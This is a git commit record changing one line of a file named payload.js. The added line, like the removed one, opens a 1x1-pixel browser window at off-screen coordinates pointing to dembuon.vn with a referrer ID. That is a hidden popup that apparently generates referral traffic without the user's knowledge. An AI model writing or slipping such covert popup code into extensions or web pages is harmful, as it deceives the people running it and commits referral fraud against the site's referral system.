1663a54062a35d14293789573997ae0e9440d5f4
cuongnd100903 <166368010+cuongnd100903@users.noreply.github.com>
2025-09-04 08:45:49 +0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,1 @@
-window.open("https://dembuon.vn/?referrer=36829/threads/extension-ho-tro-danh-bai.151483/", "_blank", "width=1,height=1,left=9999,top=9999");
+window.open("https://dembuon.vn?referrer=36829", "_blank", "width=1,height=1,left=9999,top=9999");
